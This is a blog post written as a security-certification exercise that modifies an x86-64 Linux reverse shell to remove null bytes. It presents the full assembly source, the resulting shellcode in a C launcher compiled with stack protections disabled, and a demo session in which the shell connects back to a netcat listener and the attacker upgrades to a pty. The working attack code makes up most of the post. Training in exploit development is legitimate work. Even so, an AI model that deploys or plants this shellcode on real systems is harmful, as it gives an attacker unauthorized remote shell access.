---
layout: post
title: Null-Free Reverse Shell
date: 2021-01-19 20:30:00
categories: posts
comments: false
en: true
---

These series of posts starting with the prefix "SLAE64 - Assignment" will be created in order to fulfill the requirements of the SLAE64 certification.

A Reverse shell is a form of malware which grants remote access to a system through a shell. However, it differentiates from its peer the Bind Shell, arranging a specific 
connection on a trivial address, instead of binding the compromised device into a certain port. Furthermore, after the connection is established, a shell is executed, granting 
interaction to the attacker.

The first assignment from the seven is divided in two sections:

+ A: Requires the creation of a Reverse Shell with password protection through the Assembly language, and converting such into shellcode. 
+ B: Requires the alteration of the provided Reverse Shell during the course, in order that it no longer possesses any form of NULL bytes (00). 

Due to the reason that in the [previous](https://whitecr0wz.github.io/posts/SLAE64-Reverse-Password/) post the first section of the exercise was tackled, this post will be focused 
towards the secondary task.

Let's analyze the Reverse Shell given during the course:

```term
hitecr0wz@SLAE64:~/assembly/assignments/Assignment_2/B/og$ objdump -D 1.o -M intel 

1.o:     file format elf64-x86-64


Disassembly of section .text:

0000000000000000 <_start>:
   0:   b8 29 00 00 00          mov    eax,0x29
   5:   bf 02 00 00 00          mov    edi,0x2
   a:   be 01 00 00 00          mov    esi,0x1
   f:   ba 00 00 00 00          mov    edx,0x0
  14:   0f 05                   syscall 
  16:   48 89 c7                mov    rdi,rax
  19:   48 31 c0                xor    rax,rax
  1c:   50                      push   rax
  1d:   c7 44 24 fc 7f 00 00    mov    DWORD PTR [rsp-0x4],0x100007f
  24:   01 
  25:   66 c7 44 24 fa 11 5c    mov    WORD PTR [rsp-0x6],0x5c11
  2c:   66 c7 44 24 f8 02 00    mov    WORD PTR [rsp-0x8],0x2
  33:   48 83 ec 08             sub    rsp,0x8
  37:   b8 2a 00 00 00          mov    eax,0x2a
  3c:   48 89 e6                mov    rsi,rsp
  3f:   ba 10 00 00 00          mov    edx,0x10
  44:   0f 05                   syscall 
  46:   b8 21 00 00 00          mov    eax,0x21
  4b:   be 00 00 00 00          mov    esi,0x0
  50:   0f 05                   syscall 
  52:   b8 21 00 00 00          mov    eax,0x21
  57:   be 01 00 00 00          mov    esi,0x1
  5c:   0f 05                   syscall 
  5e:   b8 21 00 00 00          mov    eax,0x21
  63:   be 02 00 00 00          mov    esi,0x2
  68:   0f 05                   syscall 
  6a:   48 31 c0                xor    rax,rax
  6d:   50                      push   rax
  6e:   48 bb 2f 62 69 6e 2f    movabs rbx,0x68732f2f6e69622f
  75:   2f 73 68 
  78:   53                      push   rbx
  79:   48 89 e7                mov    rdi,rsp
  7c:   50                      push   rax
  7d:   48 89 e2                mov    rdx,rsp
  80:   57                      push   rdi
  81:   48 89 e6                mov    rsi,rsp
  84:   48 83 c0 3b             add    rax,0x3b
  88:   0f 05                   syscall 
whitecr0wz@SLAE64:~/assembly/assignments/Assignment_2/B/og$
```

Similarly like in the prior Assignment, most of the NULL opcodes arise from MOV operations, moving small values into rather big registers (I.E performing a MOV operation against 
the value "1" into RSI). In order to prevent such values, Lower bit Registers can be used. For instance, instead of using RAX when incrementing the register, AL could be used 
instead, which performs the same operation, with no NULLs whatsoever. In addition, a similar operation could be incrementing the register by one.

Final code:

```term
global _start


_start:

	; sock = socket(AF_INET, SOCK_STREAM, 0)
	; AF_INET = 2
	; SOCK_STREAM = 1
	; syscall number 41


        xor rax, rax
        xor rdi, rdi
        xor rsi, rsi
        xor rdx, rdx

	mov al, 41

        inc rdi
        inc rdi

        inc rsi

	syscall

	; copy socket descriptor to rdi for future use

	mov rdi, rax


	; server.sin_family = AF_INET
	; server.sin_port = htons(PORT)
	; server.sin_addr.s_addr = inet_addr("127.0.0.1")
	; bzero(&server.sin_zero, 8)

	xor rdx, rdx
        xor rbp, rbp

        push word 0x2
        pop bp

	push rdx

	mov dword [rsp-4], 0x0101017f
	mov word [rsp-6], 0x5c11
	mov word [rsp-8], bp
	sub rsp, 8

	; connect(sock, (struct sockaddr *)&server, sockaddr_len)

	mov al, 42
	mov rsi, rsp
	mov dl, 16
	syscall


        ; duplicate sockets

        ; dup2 (new, old)

	mov al, 33

        xor rsi, rsi

        syscall

        mov al, 33

        inc rsi

        syscall

        mov al, 33

        inc rsi

        syscall


        ; execve

        ; First NULL push

        xor rax, rax
        push rax

        ; push /bin//sh in reverse

        mov rbx, 0x68732f2f6e69622f
        push rbx

        ; store /bin//sh address in RDI

        mov rdi, rsp

        ; Second NULL push
        push rax

        ; set RDX
        mov rdx, rsp


        ; Push address of /bin//sh
        push rdi

        ; set RSI

        mov rsi, rsp

        ; Call the Execve syscall
        add rax, 59
        syscall
```

Let's assemble, link this and get its shellcode!

```term
whitecr0wz@SLAE64:~/assembly/assignments/Assignment_2/B$ nasm -f elf64 1.asm -o 1.o && ld 1.o -o 1 && for i in $(objdump -d 1 -M intel |grep "^ " |cut -f2); do echo -n '\x'$i; done;echo
```

###### C format

```term
#include <stdio.h>
#include <string.h>

unsigned char code[] = \
"\x48\x31\xc0\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\xb0\x29\x48\xff\xc7\x48\xff\xc7\x48\xff\xc6\x0f\x05\x48\x89\xc7\x48\x31\xd2\x48\x31\xed\x66\x6a\x02\x66\x5d\x52\xc7\x44\x24\xfc
\x7f\x01\x01\x01\x66\xc7\x44\x24\xfa\x11\x5c\x66\x89\x6c\x24\xf8\x48\x83\xec\x08\xb0\x2a\x48\x89\xe6\xb2\x10\x0f\x05\xb0\x21\x48\x31\xf6\x0f\x05\xb0\x21\x48\xff\xc6\x0f\x05\xb0\
x21\x48\xff\xc6\x0f\x05\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\x50\x48\x89\xe2\x57\x48\x89\xe6\x48\x83\xc0\x3b\x0f\x05"

;

main()
{
 
printf("Shellcode Length:  %d\n", (int)strlen(code));
 
int (*ret)() = (int(*)())code;
 
ret();
 
}
```

#### EndGame

```term
whitecr0wz@SLAE64:~/assembly/assignments/Assignment_2/B$ gcc reverse-null-free.c -o reverse-null-free -fno-stack-protector -z execstack -w 
whitecr0wz@SLAE64:~/assembly/assignments/Assignment_2/B$ ./reverse-null-free 
Shellcode Length:  126
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
whitecr0wz@SLAE64:~$ nc -lvp 4444 
listening on [any] 4444 ...
connect to [127.1.1.1] from localhost [127.0.0.1] 40484
id
uid=1000(whitecr0wz) gid=1000(whitecr0wz) groups=1000(whitecr0wz),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),111(bluetooth)
pwd
/home/whitecr0wz/assembly/assignments/Assignment_2/B
python3 -c 'import pty;pty.spawn("/bin/bash")';
whitecr0wz@SLAE64:/home/whitecr0wz/assembly/assignments/Assignment_2/B$ id 
id 
uid=1000(whitecr0wz) gid=1000(whitecr0wz) groups=1000(whitecr0wz),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),111(bluetooth)
whitecr0wz@SLAE64:/home/whitecr0wz/assembly/assignments/Assignment_2/B$
```

### Code

This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification: [http://securitytube-training.com/online-
courses/securitytube-linux-assembly-expert/](http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/)

Student ID: SLAE64–27812/PA-27812

You can find all of the used resources within this post [here](https://github.com/whitecr0wz/SLAE/tree/main/SLAE64/Assignment_2/B).
